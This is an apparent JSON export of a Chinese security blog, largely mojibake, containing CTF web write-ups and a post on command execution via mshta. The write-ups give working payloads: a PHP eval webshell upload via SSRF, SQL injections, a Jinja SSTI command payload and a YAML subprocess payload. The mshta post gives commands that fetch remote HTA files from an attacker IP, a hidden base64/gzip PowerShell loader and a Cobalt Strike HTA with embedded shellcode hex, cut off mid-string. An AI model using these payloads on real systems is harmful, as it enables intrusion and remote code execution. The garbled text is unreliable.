{"meta":{"title":"Patrilic's blog","subtitle":null,"description":null,"author":"Patrilic","url":"http://patrilic.top","root":"/"},"pages":[],"posts":[{"title":"CISCN 2019 Final Web11 ËµõÂêéÂ§çÁõò","slug":"CISCN 2019 Final Web11","date":"2019-07-28T07:08:02.000Z","updated":"2019-07-28T06:45:17.697Z","comments":true,"path":"2019/07/28/CISCN 2019 Final Web11/","link":"","permalink":"http://patrilic.top/2019/07/28/CISCN 2019 Final Web11/","excerpt":"","text":"[toc] ÊØîËµõÁöÑÊó∂ÂÄôÁÜ¨‰∫Ü‰∏Ä‰∏áÂπ¥ÔºåÂè™ÁúãÂà∞‰∫Ü‰∏Ä‰∏™Êú¨Âú∞ËØ∑Ê±ÇÔºåÈÉΩ‰∏çÁü•ÈÅìËøô‰∏™ssrfÊÄé‰πàÂà©Áî®ÔºåÂìéÔºåËøòÊòØË¶ÅÂ•ΩÂ•ΩÂ≠¶ÈÄÜÂêë(ÂêêË°Ä) È¢òÁõÆ‰ø°ÊÅØÈ¢òÁõÆÈìæÊé•Ôºöhttp://web65.buuoj.cn/ (Êé®‰∏ÄÊâãÂåóËÅîÂêàÂ∏àÂÇÖÁöÑÂπ≥Âè∞)È¢òÁõÆÊ∫êÁ†ÅÔºöhttps://github.com/imagemlt/CISCN_2019_final_pmarkdown.git Write up‰∏ä‰º†Êñá‰ª∂ÊòæÁ§∫Âè™ËÉΩlocalhost‰∏ä‰º†ÔºåÂπ∂‰∏î‰ΩøÁî®$SERVER[‚ÄòRemote-addr‚Äô]Êù•Ëé∑ÂèñipÊÑüËßâÂè™ËÉΩÈááÁî®ssrf‰πãÁ±ªÁöÑÊñπÂºèÂéª‰∏ä‰º†Êñá‰ª∂Ôºå‰ΩÜÊòØ‰∏ÄÁõ¥Ê≤°getÂà∞ÁÇπ http://web65.buuoj.cn/index.php?act=post&amp;md=readme.mdmdÂèÇÊï∞Â≠òÂú®‰ªªÊÑèÊñá‰ª∂ËØªÂèñÔºåÂèØ‰ª•Âà©Áî®php‰º™ÂçèËÆÆËØªÊ∫êÁ†Å ÁÑ∂ËÄåÂπ∂Ê≤°Êúâ‰ªÄ‰πàÁî®ÔºåÊØîËµõÁöÑÊó∂ÂÄôÂ∞±‰∏ÄÁõ¥Âç°Âú®ËøôÈáå„ÄÇ‰∏ÄÁõ¥Âú®ÊÉ≥ÊÄé‰πàÂéªÁªïËøáÔºåÁÑ∂ÂêéÊØîËµõÁªô‰∫ÜÊèêÁ§∫Ôºö121. SSRF2. .htaccess .htaccessÂèØ‰ª•ÁúãÂà∞‰ªñËÆ©.mdÊ†ºÂºèËß£ÊûêÊàê‰∫Üphp ‰ΩÜÊòØssrfÂèàÊÄé‰πàÂéªÁúãÂë¢ÔºåÊ∫êÁ†ÅÈáåËÇØÂÆöÊ≤°ÊúâÔºåÈóÆÈ¢òÂ∫îËØ•Âá∫Âú®.soÊñá‰ª∂Èáåpost.phpÈáåË∞ÉÁî®‰∫Ü pmark_include() ÂáΩÊï∞ ËÄåÂú®readme.mdÈáåÊòØËÉΩÊääsoÊñá‰ª∂‰∏ã‰∏ãÊù•ÁöÑÊâìÂºÄIDAÂàÜÊûê‰∏ÄÊ≥¢ sub_1850ÈáåÂ≠òÂú®‰∏Ä‰∏™HttpÂåÖÔºå‰ºö‰ª•127.0.0.1ÁöÑË∫´‰ªΩÂéªrequest ÂæÄ‰∏äÊâæË∞ÉÁî®1int zend_hash_find ( HashTable* ht, char* arKey, uint nKeyLength, void** pData ) v15: debug ÂèÇÊï∞‰∏∫debug,Âà©Áî®ssrf‰∏ä‰º†Âç≥ÂèØ ÊâÄ‰ª•ÂèØ‰ª•Áõ¥Êé•ÊûÑÈÄ†payload:12345678910111213141516171819POST /upload.php HTTP/1.1Host: 127.0.0.1:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:66.0) Gecko/20100101 Firefox/66.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh,en-US;q=0.7,en;q=0.3Referer: http://127.0.0.1:8080/index.php?act=uploadContent-Type: multipart/form-data; boundary=---------------------------6693638881479522630623693797Content-Length: 244Connection: closeUpgrade-Insecure-Requests: 1-----------------------------6693638881479522630623693797Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.php&quot;Content-Type: text/php&lt;?phpeval($_REQUEST[a]);-----------------------------6693638881479522630623693797-- Âà©Áî®popen()ÁªïËøádisabled_function","categories":[],"tags":[]},{"title":"CISCN2019-Ë•øÂçóËµõÂå∫ÈÉ®ÂàÜWebÈ¢òËß£","slug":"CISCN2019-Ë•øÂçóËµõÂå∫ÈÉ®ÂàÜWebÈ¢òËß£","date":"2019-06-10T07:08:02.000Z","updated":"2019-07-13T02:59:53.650Z","comments":true,"path":"2019/06/10/CISCN2019-Ë•øÂçóËµõÂå∫ÈÉ®ÂàÜWebÈ¢òËß£/","link":"","permalink":"http://patrilic.top/2019/06/10/CISCN2019-Ë•øÂçóËµõÂå∫ÈÉ®ÂàÜWebÈ¢òËß£/","excerpt":"","text":"Êãø‰∫Ü‰∏™Á¨¨Âõõ..Â∏àÂÇÖ‰ª¨tqlÔºåÁ∫Øweb QAQ Ciscn-q07ÂÖàÊ≥®ÂÜå‰∏Ä‰∏™admin‚Äô# ÁöÑË¥¶Âè∑ÁÑ∂ÂêéÁõ¥Êé•Êñá‰ª∂‰∏ä‰º†Áõ¥Êé•‰º†php(‰∏çÁî®&lt;?php)Êîπmime‰∏∫image/jpegÂ∞±getshell‰∫Ü.. Âà§ÂÆö‰∫Ü‰∏Ä‰∏™adminÁöÑÊùÉÈôê Ciscn-q09Ê≥®ÂÜåÁî®Êà∑ÁôªÈôÜÁöÑÊó∂ÂÄôÔºåÂèëÁé∞Â≠òÂú®sqlÊ≥®ÂÖ•ÁôªÈôÜËøõÂéª‰πãÂêéÂèëÁé∞Ê≥®ÈáäÊúâÊèêÁ§∫ÔºåÂ≠òÂú®adminÁöÑË¥¶Âè∑ÔºåÊ≥®ÂÜå‰∏Ä‰∏™Áî®Êà∑Âêç‰∏∫‰∏ãÈù¢ÁöÑË¥¶Âè∑ÔºåÁôªÈôÜÂç≥ÂèØÊ≥®ÂÖ•adminÁöÑÂØÜÁ†Å1username=&apos;&amp;amp;&amp;amp; extractvalue(1,concat(0x7e,(select `3` from (select 1,2,3 union select * from user)a limit 1,1)))# Áî®adminÁöÑË¥¶Âè∑ÂíåÂØÜÁ†ÅÁôªÈôÜÊèêÁ§∫orangeÁöÑSSRFÔºåÂèØÊéßurlÂ∞±ÊòØbugÂèçÈ¶à Êê∫Â∏¶cookieÂéªËØ∑Ê±Çflag.phpÂç≥ÂèØËé∑Âæóflag Ciscn 8URLÔºö172.16.9.18ÁúãÁùÄÊúâËÆ°ÁÆóÂäüËÉΩÔºåÂπ∂‰∏îÊòØPYÔºåÁõ¥Êé•ÊÉ≥SSTIÔºåËØï‰∫Ü‰∏ã 2ÂæóÂà∞ËæìÂá∫ÁªìÊûú‰∏∫2ÔºåÁ°ÆÂÆö‰∫ÜSSTI ÁÑ∂ÂêéÂ∞±ÊòØÁî®payload‰∫ÜÔºå‰∏çËøáÊµãËØïËøáÁ®ã‰∏≠ÂèëÁé∞‰∫Ü‰∏§‰∏™ËøáÊª§ÁöÑÁÇπ ‰∏Ä‰∏™ÊòØÊã¨Âè∑Ôºå‰∏Ä‰∏™ÊòØopenÂ≠óÁ¨¶‰∏≤Ôºå‰∏çËøáÈÉΩÂèØ‰ª•Áî®ÂèåÂÜôÊù•ÁªïËøá Êã¨Âè∑Âè™ÊòØÂçïÁã¨ÁöÑÊã¨Âè∑Â∞±‰ºöË¢´ÁΩÆÊç¢‰∏∫Á©∫ÔºåÂ¶ÇÊûúÈáåÈù¢ÊúâÂ≠óÁ¨¶ÁöÑËØùÂ∞±‰∏ç‰ºöÁΩÆÊç¢‰∏∫Á©∫ ÊØîÂ¶Ç () Ë¶ÅÁî® (()) ÁªïÔºå open Ë¶ÅÁî® opopenen Áªï‰∫éÊòØÊúÄÁªàÁöÑpayload‰∏∫1&#123;&#123;&quot;&quot;.__class__.__mro__.__getitem__(1).__subclasses__(())[302].__init__.__globals__[&apos;poopenpen&apos;](&apos;cat flag&apos;).read(())&#125;&#125; Ciscn 10URLÔºö 172.16.9.20ÁÇπÂáªÂøòËÆ∞ÂØÜÁ†Å ‰øÆÊîπÂêéÂèØÁõ¥Êé•ÁôªÂΩïadmin ÁåúÊµãyamlÂëΩ‰ª§ÊâßË°åÊâßË°ålsÁªìÊûú PayloadÔºö1234!!map &#123;? !!str &quot;goodbye&quot;: !!python/object/apply:subprocess.check_output [!!str &quot;ls&quot;,],&#125; ÂáÜÂ§áÊûÑÈÄ†payload ËøõË°åcat /flagÊó∂ÂèëÁé∞Âà´‰∫∫‰∏ä‰º†‰∫Ü5.ymlÁõ¥Êé•ËÆøÈóÆÂç≥ÂèØÔºö flag{81595b84-317b-434a-b45f-6aea2c37722c}","categories":[],"tags":[]},{"title":"QWB2019 Web -Èöè‰æøÊ≥®ÔºàÈ¢òËß£Ôºâ","slug":"QWB2019 Web -Èöè‰æøÊ≥®ÔºàÈ¢òËß£Ôºâ","date":"2019-06-05T12:59:32.000Z","updated":"2019-07-13T03:01:04.420Z","comments":true,"path":"2019/06/05/QWB2019 Web -Èöè‰æøÊ≥®ÔºàÈ¢òËß£Ôºâ/","link":"","permalink":"http://patrilic.top/2019/06/05/QWB2019 Web -Èöè‰æøÊ≥®ÔºàÈ¢òËß£Ôºâ/","excerpt":"","text":"Á¨¨‰∏ÄÊ¨°ÈÅáÂà∞‰ΩøÁî® mysqli_multi_query() ÁöÑÈ¢òÁõÆÔºåÂÅö‰∏™ËÆ∞ÂΩï Ê¶ÇÁéáËÆ∫‰ΩøÊàëÊÜîÊÇ¥ 0x01 ÊÄùË∑ØÊâìÂºÄÈ¢òÁõÆÔºåÂ∞±‰∏Ä‰∏™&lt;input>Ê†áÁ≠æÔºåÈöè‰æøËæì‰∏Ä‰∏™Êï∞Â≠óÔºåburpÊäì‰∏Ä‰∏ã ÊÑüËßâÊòØ‰∏ÄËà¨ÁöÑselectËØ≠Âè•1select id, data from table_name where id = &#123;$inject&#125; Êµã‰∏Ä‰∏ãËøáÊª§ÊÉÖÂÜµÈöè‰æøËæìÂÖ•‰∏Ä‰∏™ÁàÜÂá∫ËøáÊª§ÊÉÖÂÜµ1return preg_match(\"/select|update|delete|drop|insert|where|\\./i\", $inject); Â∞ùËØï‰∏ÄÊ≥¢extractvalue(),Êó†Êûú.. ÁÑ∂ÂêéÂ∞±Âú®ÊµãËØï‰∏Ä‰∫õÂ∏∏Áî®ÁöÑÊÉÖÂÜµÔºåÁ±ª‰ºº‰∫é1if((substr(user(),1,1)&gt;'a'),sleep(5),1); ÂêéÊù•@hpdogerÂëäËØâÊàëËØ¥ÂèØ‰ª•Â†ÜÂè†Êü•ËØ¢..‰∫éÊòØ‰πé..1show databases; 1show tables 1describe`1919810931114514` 1show variables like 'version' ÊâÄ‰ª•Áé∞Âú®ÁöÑ‰ø°ÊÅØÂ∞±ÊòØ1234database: supersqlitable: 1919810931114514column: flagversion: 10.0.27-MariaDB-0ubuntu0.16.04.1 ÁÑ∂ÂêéËøòÊúâ‰∏™Â•ΩÁé©ÁöÑÔºöÊü•ÁúãgrantÁöÑÊó∂ÂÄô: ;SHOW GRANTS FOR CURRENT_USER() Áé∞Âú®ÁõÆÊ†áÊòéÁ°ÆÔºåÂ∞±ÊòØË¶Å1select flag from 191981093111414 ÊñπÊ≥ï1Âà©Áî®setÂ∞Üselect flag from 1919810931114514ÂÜôÂÖ•ÂèòÈáè@patrilic‰∏≠ÔºåÂà©Áî®prepareÂ∞ÜÂèòÈáèËÆæÁΩÆ‰∏∫È¢ÑÂ§ÑÁêÜÔºåÁÑ∂ÂêéÂÜçexecute ‰∏ªË¶ÅÂèØ‰ª•bypassÊéâselectÔºåÁî®char()ÂáΩÊï∞Â∏¶ÂÖ•„ÄÇ1set @patrilic=concat(char(115,101,108,101,99,116,32),char(102,108,97,103,32),char(102,114,111,109,32),1919810931114514); ÁÑ∂ÂêéÁõ¥Êé•ÊâßË°åÂç≥ÂèØ.payload:1inject=&apos;;SET+@patrilic=concat(char(115,101,108,101,99,116,32),char(102,108,97,103,32),char(102,114,111,109,32),char(96),1919810931114514,char(96));prepare+patrilic+from+@patrilic;execute+patrilic%23 ÂèÇËÄÉ:https://blog.csdn.net/qq_42030417/article/details/80372800 ÊñπÊ≥ï2Âà©Áî®mysql::handler ‰πüÂèØ‰ΩøÁî®Âà´Âêç payload:1inject=&apos;;handler+`1919810931114514`+open;handler`1919810931114514`read+first%23 ÂèÇËÄÉÔºöhttps://dev.mysql.com/doc/refman/5.7/en/handler.htmlhttps://blog.csdn.net/JesseYoung/article/details/40785137 ÊñπÊ≥ï3‚Ä¶","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://patrilic.top/tags/CTF/"}]},{"title":"Command Execute By mshta","slug":"Command Execute By mshta","date":"2019-05-08T03:20:33.000Z","updated":"2019-07-13T03:00:37.758Z","comments":true,"path":"2019/05/08/Command Execute By mshta/","link":"","permalink":"http://patrilic.top/2019/05/08/Command Execute By mshta/","excerpt":"","text":"0x01 mshtaüëâÂÆòÊñπÊñáÊ°£Áõ¥ÈÄöËΩ¶ ‚Äì&gt;üöóÊª¥Êª¥Êª¥) ÊÄùË∑ØÔºöÂà©Áî®MshtaÊâßË°åJavaScript/VBscript Ë∞ÉÁî®WScript.shellÊâßË°åÂëΩ‰ª§ÁªìÂêàVBS‰∏ãËΩΩC2 payloadÔºåJS‰∏ãËΩΩpayloadÔºåJSRATÔºåÁõ¥Êé•ÂèçÂºπsession‚Ä¶‚Ä¶eg:123mshta vbscript:window.execScript(\"alert('hello world!');\",\"javascript\") mshta javascript:window.execScript(\"msgBox('hello world!'):window.close\",\"vbs\") ÊµãËØïÔºö Attacker : 192.168.199.142 MacOSVictim : 192.168.121.130 Windows 10 1809 0x02 MetaSploit::hta_serverexploit/windows/misc/hta_server ÂèóÂÆ≥Êú∫ÊâßË°å1mshta http://192.168.199.142:8080/wSbMp9V.hta ‰ºöË¢´DefenderÊã¶Êà™Ê†∑Êú¨ÂàÜÊûê ‰∏∫Base64Âä†ÂØÜÁöÑps1‰ª£Á†Å123456789101112if([IntPtr]::Size -eq 4)&#123; $b=&apos;powershell.exe&apos;&#125;else&#123; $b=$env:windir+&apos;\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe&apos;&#125;; $s=New-Object System.Diagnostics.ProcessStartInfo; $s.FileName=$b; $s.Arguments=&apos;-nop -w hidden -c &amp;([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(&apos;&apos;H4sIABhN0FwCA7VW+2/aSBD+OZH6P1gVkm2FYCC0aSJVujVPE5xAHAiEQ6fFXtsLa5vYa169/u83C3abXtO79qSzeOxjZnbmm29m7aahzWkUSr4xlz69OT3p4xgHklJwR1dFqRDdqCcnsFrYs2pd+igpU7RaNaIA03B2fV1P45iE/DgvtQlHSUKCOaMkUVTpT+nRJzE5v5sviM2lT1Lhj1KbRXPMMrFdHds+kc5R6Ii9XmRj4UrJWjHKFfn332V1el6ZlZrPKWaJIlu7hJOg5DAmq9JnVRz4sFsRRTapHUdJ5PLSIw0vqqVhmGCX3IK1NTEJ9yMnkVWIAj4x4WkcSod4hIHjtiLDsB9HNnKcmCSJXJSmwvR0NvtNmWbn3qchpwEpGSEncbSySLymNklKHRw6jNwTdwZaFo9p6M1UFcTW0ZIohTBlrCj9ihnllmxy1H5WSXmpBFJ9HqtFSOMrcZqRkzJy1JRfcVSkXoXnmH7A7fOb0zenbk6U+YX5kigwOpkexgRcU/pRQg9iH6VyUTLhEMyjeAfTwkOcEnX2BVipsF4Wf6xdyUVB0Kt0rS2sTUcRdWagkyWzsAnmYvnHnGwQl4aksQtxQO2cdsprABOXkUOApVzsFpxS5GyDOA3CiIe5gEzk+Tu1ZkD5F109pcwhMbIhSQl4BflTv3XmmAVFNkKTBIDQcQ7EK7hAdpJLZwTf5aeLOQjJdYaTpCj1U6g2uyhZBDPiFCUUJjTbQimPDkP5q7tmyji1ccJzczM1gzE7rh6FCY9TG3IGoT9YK2JTzAQSRalDHaLvLOrlx8qv4lDHjEEJgKU15AFWRPwWF0yIwUPIulqyCDeCFSMBSBxqvsWwBxWe0fxAHOwRR/6bezmLj5QVOOQAvHAOkmuxiBelEY05dA6B6YFB/+XwFy1DuFGPSZYEJS+Mqb7jgs+FjXUlyJghcog/5hB7K44CHSfkfe3YHJS32h2tI3gmRshMW1/SCtrQimHCd0gvjKhx6dx0Fx0tbmx9FxmJYXb6jUGnU1t3rVGNW02D3/QNbjbHi4WFOvfDCX8yUOeBlpeT2n7VpXurh5zJVnu/1/ebsr7dLzzHnTRc17t0rfvKuxbtPdYHermKe41m2nvUN3q5ljTppjOgw8Gy2+LzyYjhoat548oVpttevBhVInNvINT2L+x91x21fdPZTTqULLRyjw7QAKEb+344bHsrr50g7Wr0XA8W6NkkdxgZqDnadd8xfTBs6WjY1Af4LupfnDW0ypPz3Gw9jXE3YE67o1UmY+SgWHvw/MrlnR8KnLCnP+tCBvWedi0NZPo11KlV6f7pedD2UBNkRkGEcIsuh2djsHn7ADqPw4oTIR4aY00beZqHXMufYKSDtP6MWnpU333om31tNKr6lfmy4oPPZLz+YHbRWcvua5p2FszhV0O2udqGY31zud5w3H0E2w/a1fDjW8EQoEhhVa0+vcj9j7q1iePExww4AW04L8FWFLey3tqPqNBQFHEZL0kcEga3Gdx3OZURY5Et+rpownClHBu9uHeGMLyovjpSpS+C6td2ny9dXz+Bj1AaQN9Sj4Qe94vl7UW5DO27vK2VIcSfD6serXaKsFQU3f8AS2aZHSyromAK6fJ/xSqrUR/+nH/B6uvaP+z+FH7l4jHa75a/XfglNH818EdMOQha0GMYOV5vr8af0eLF1Z8uIedu9og3t7uUn9/C+8Cb078ABtGBSyEKAAA=&apos;&apos;))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))&apos;; $s.UseShellExecute=$false; $s.RedirectStandardOutput=$true; $s.WindowStyle=&apos;Hidden&apos;; $s.CreateNoWindow=$true; $p=[System.Diagnostics.Process]::Start($s); Ëß£ÂØÜÂêé1if([IntPtr]::Size -eq 4)&#123;$b='powershell.exe'&#125;else&#123;$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'&#125;;$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c &amp;([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIABhN0FwCA7VW+2/aSBD+OZH6P1gVkm2FYCC0aSJVujVPE5xAHAiEQ6fFXtsLa5vYa169/u83C3abXtO79qSzeOxjZnbmm29m7aahzWkUSr4xlz69OT3p4xgHklJwR1dFqRDdqCcnsFrYs2pd+igpU7RaNaIA03B2fV1P45iE/DgvtQlHSUKCOaMkUVTpT+nRJzE5v5sviM2lT1Lhj1KbRXPMMrFdHds+kc5R6Ii9XmRj4UrJWjHKFfn332V1el6ZlZrPKWaJIlu7hJOg5DAmq9JnVRz4sFsRRTapHUdJ5PLSIw0vqqVhmGCX3IK1NTEJ9yMnkVWIAj4x4WkcSod4hIHjtiLDsB9HNnKcmCSJXJSmwvR0NvtNmWbn3qchpwEpGSEncbSySLymNklKHRw6jNwTdwZaFo9p6M1UFcTW0ZIohTBlrCj9ihnllmxy1H5WSXmpBFJ9HqtFSOMrcZqRkzJy1JRfcVSkXoXnmH7A7fOb0zenbk6U+YX5kigwOpkexgRcU/pRQg9iH6VyUTLhEMyjeAfTwkOcEnX2BVipsF4Wf6xdyUVB0Kt0rS2sTUcRdWagkyWzsAnmYvnHnGwQl4aksQtxQO2cdsprABOXkUOApVzsFpxS5GyDOA3CiIe5gEzk+Tu1ZkD5F109pcwhMbIhSQl4BflTv3XmmAVFNkKTBIDQcQ7EK7hAdpJLZwTf5aeLOQjJdYaTpCj1U6g2uyhZBDPiFCUUJjTbQimPDkP5q7tmyji1ccJzczM1gzE7rh6FCY9TG3IGoT9YK2JTzAQSRalDHaLvLOrlx8qv4lDHjEEJgKU15AFWRPwWF0yIwUPIulqyCDeCFSMBSBxqvsWwBxWe0fxAHOwRR/6bezmLj5QVOOQAvHAOkmuxiBelEY05dA6B6YFB/+XwFy1DuFGPSZYEJS+Mqb7jgs+FjXUlyJghcog/5hB7K44CHSfkfe3YHJS32h2tI3gmRshMW1/SCtrQimHCd0gvjKhx6dx0Fx0tbmx9FxmJYXb6jUGnU1t3rVGNW02D3/QNbjbHi4WFOvfDCX8yUOeBlpeT2n7VpXurh5zJVnu/1/ebsr7dLzzHnTRc17t0rfvKuxbtPdYHermKe41m2nvUN3q5ljTppjOgw8Gy2+LzyYjhoat548oVpttevBhVInNvINT2L+x91x21fdPZTTqULLRyjw7QAKEb+344bHsrr50g7Wr0XA8W6NkkdxgZqDnadd8xfTBs6WjY1Af4LupfnDW0ypPz3Gw9jXE3YE67o1UmY+SgWHvw/MrlnR8KnLCnP+tCBvWedi0NZPo11KlV6f7pedD2UBNkRkGEcIsuh2djsHn7ADqPw4oTIR4aY00beZqHXMufYKSDtP6MWnpU333om31tNKr6lfmy4oPPZLz+YHbRWcvua5p2FszhV0O2udqGY31zud5w3H0E2w/a1fDjW8EQoEhhVa0+vcj9j7q1iePExww4AW04L8FWFLey3tqPqNBQFHEZL0kcEga3Gdx3OZURY5Et+rpownClHBu9uHeGMLyovjpSpS+C6td2ny9dXz+Bj1AaQN9Sj4Qe94vl7UW5DO27vK2VIcSfD6serXaKsFQU3f8AS2aZHSyromAK6fJ/xSqrUR/+nH/B6uvaP+z+FH7l4jHa75a/XfglNH818EdMOQha0GMYOV5vr8af0eLF1Z8uIedu9og3t7uUn9/C+8Cb078ABtGBSyEKAAA=''))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s); GzipÊñá‰ª∂ÊµÅBase64Âä†ÂØÜ DefenderÊã¶Êà™ 0x03 Cobalt StrikeAttacks ‚Äì&gt; Packages ‚Äì&gt; HTML Application ÁîüÊàêÁöÑ.HTAÊñá‰ª∂Â≠òÂú®Êú¨Âú∞ÔºåÂèØ‰ª•ÈÄöËøáÂ§öÁßçÊñπÂºè‰º†ÂÖ•ÂèóÂÆ≥Êú∫ÂèóÂÆ≥Êú∫‰∏äÊâßË°åÂëΩ‰ª§1mshta http://192.168.199.142:8080/evil.hta evil.hta1234567891011121314151617181920212223242526272829&lt;script language=&quot;VBScript&quot;&gt; Function var_func() var_shellcode = &quot;04d5a9000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000504500004c010700e26f3a570000000000000000e0000f030b010216001c00000034000000060000b0140000001000000030000000004000001000000002000004000000010000000400000000000000009000000004000024dc0000020000000000200000100000000010000010000000000000100000000000000000000000006000003006000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000018000000000000000000000000000000000000001c610000e00000000000000000000000000000000000000000000000000000002e74657874000000c41a000000100000001c000000040000000000000000000000000000600050602e6461746100000024060000003000000008000000200000000000000000000000000000400060c02e72646174610000d0020000004000000004000000280000000000000000000000000000400030402e627373000000001c040000005000000000000000000000000000000000000000000000800060c02e69646174610000300600000060000000080000002c0000000000000000000000000000400030c02e4352540000000034000000007000000002000000340000000000000000000000000000400030c02e746c730000000020000000008000000002000000360000000000000000000000000000400030c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f3c38db426000000008dbc270000000083ec2ca120504000c744241018504000c74424080c504000c744240408504000a318504000a124504000c70424045040008944240ce896190000a31c50400083c42cc38db6000000008dbc270000000083ec1c31c066813d000040004d5ac7053050400001000000c7052c50400001000000c7052850400001000000c7053c504000010000007468a314504000a14050400085c0744ac7042402000000e836190000c70424ffffffffe8020800008b1544504000a3fc534000a300544000a1ac6140008910e8260b0000833d1436400001746d31c083c41cc38db42600000000c7042401000000e8ec180000ebb466908b153c00400081ba00004000504500008d8a0000400075800fb751186681fa0b01743f6681fa0b020f856affffff83b9840000000e0f865dffffff8b91f800000031c085d20f95c0e94bffffff8d7600c70424a01b4000e8340a000031c083c41cc38379740e0f862cffffff8b89e800000031c085c90f95c0e91affffff66905531c089e5b91100000057568d55a45389d783ec7cf3abb030e8d217000029c48d44241b83e0f0c700ccccccccc74004ccccccccc74008ccccccccc7400cccccccccc74010ccccccccc74014ccccccccc74018ccccccccc7401ccccccccc83e4f0a14050400085c00f858502000064a1180000008b35686140008b5804eb159039d80f8418020000c70424e8030000ffd683ec04c744240800000000895c2404c7042404544000e89417000083ec0c85c075cda10854400031db83f8010f84f0010000a10854400085c00f8434020000c7050050400001000000a10854400083f8010f84e801000085db7507f0871d04544000a18040400085c0741cc744240800000000c744240402000000c7042400000000ffd083ec0ce8130c0000c70424b0194000ff156461400083ec04a348504000e8a9110000c744240400404000890424ff154061400083ec0885c07409c7042400104000ffd0e843120000a14050400085c0745ea1a061400031c98b00eb0b84d2742b84c9741c83c0010fb61080fa207eed89cb83f30180fa220f44cbebe884d2740b83c0010fb61080fa207ef10fb755d4f645d001a3e4534000b80a000000c705ec534000000040000f45c2a3e85340008b150450400031db8d049504000000895594890424e89a1600008b3d085040008945908b459485c07e3c66908b049f890424e8851600008d7001893424e8721600008b559089049a8b149f83c3018974240889042489542404e84e1600003b5d9475c9c1e3028b4590c7041800000000a308504000e8f2110000a1906140008b150c5040008910a10c50400089442408a10850400089442404a104504000890424e89a0200008b351450400085f6a3105040000f84aa0000008b1d0050400085db750ae8fc150000a1105040008d65f45b5e5f5dc38db42600000000a108544000bb0100000083f8010f8510feffffc704241f000000e8d1150000a10854400083f8010f851bfeffff8d7600c744240408704000c7042400704000e8b4150000c7050854400002000000e9f5fdffff891424ff154461400083ec04e96afdffffc7050854400001000000c744240418704000c704240c704000e876150000e9b3fdffff890424e8711500009083ec0cc7054050400001000000e80e11000083c40ce9b6fcffff8db60000000083ec0cc7054050400000000000e8ee10000083c40ce996fcffff9090909090905589e583ec18a12036400085c0743cc7042420404000ff153c614000ba0000000083ec0485c07416c74424042e404000890424ff154061400083ec0889c285d27409c7042420364000ffd2c9c38d76005589e55dc390909090909090909090905589e55383ec348b450cc744240c40000000c74424080010000089442404c7042400000000a178614000ffd083ec108945f0c745f400000000eb448b45f489c1034d088b45f40345080fb6188b45f489c2c1fa1fc1ea1e01d083e00329d00345100fb60031d888018b45f489c20355088b45f40345f00fb61288108345f4018b45f43b450c7cb48b45f0c744241400000000c744241000000000c744240c0000000089442408c744240400000000c7042400000000a11c614000ffd083ec188b5dfcc9c35589e583ec28c745f4003040008b45f48b4004890424e8c91300008945f08b45f48b400489c18b45f483c01089c28b45f0894c240889542404890424e89b1300008b45f48d50088b45f48b400489542408894424048b45f0890424e8dcfeffff8b45f0890424e8a9130000c9c39090908d4c240483e4f0ff71fc5589e55183ec14e8160f0000c7042400000000e86effffffc7042410270000a168614000ffd083ec04ebed9090900000000083ec1c8b44242485c0741583f8037410b80100000083c41cc20c00908d7426008b542428894424048b44242089542408890424e8d8110000b80100000083c41cc20c008db6000000008dbc27000000005383ec188b15c46140008b442424833a037631833d1036400002740ac705103640000200000083f8020f840401000083f8010f849a00000083c418b8010000005bc20c00c705f853400001000000c7042444404000ff155861400083ec0485c0a3385040000f84f80000008b1d40614000c744240451404000890424ffd3a3f4534000a13850400083ec08c74424046c404000890424ffd38b153850400083ec0885d2a3f05340000f84b50000008b0df453400085c9743b85c07437c705103640000100000083c418b8010000005bc20c008b442428c744240401000000894424088b442420890424e8d2100000e945ffffffc705f053400000000000c705f453400000000000891424ff152861400083ec04c7053850400000000000b801000000c705103640000000000083c4185bc20c00bb3070400081fb307040000f84f4feffff8b0385c07402ffd083c30481fb3070400075ed83c418b8010000005bc20c00c705f053400000000000c705f453400000000000eb9a8db4260000000031c0c390909090909090909090909090a194614000ffe09090909090909090908b442404c38d7426008dbc27000000008b442404c390909090909090909090905383ec28a1005440008b5c2430890424e8cbffffff83f8ff894424180f847e000000c7042408000000e832110000a100544000890424e8a5ffffff89442418a1fc534000890424e894ffffff891c248944241c8d44241c894424088d44241889442404e80011000089c38b442418890424e87affffffa3005440008b44241c890424e869ffffffc7042408000000a3fc534000e8d810000083c42889d85bc390891c24ff15bc61400083c42889c389d85bc38db426000000008dbc270000000083ec1c8b442420890424e831ffffff83f80119c083c41cc39090909090909090565383ec248b5c24308b038b003d910000c077433d8d0000c07269be01000000c744240400000000c7042408000000e86410000083f8010f841301000085c0742bc7042408000000ffd0b8ffffffff83c4245b5ec204003d940000c074673d960000c0742d3d930000c074afa14850400085c00f84ca000000895c243083c4245b5effe03d050000c074453d1d0000c075dac744240400000000c7042404000000e8f20f000083f801745c85c074bdc7042404000000ffd083c424b8ffffffff5b5ec2040031f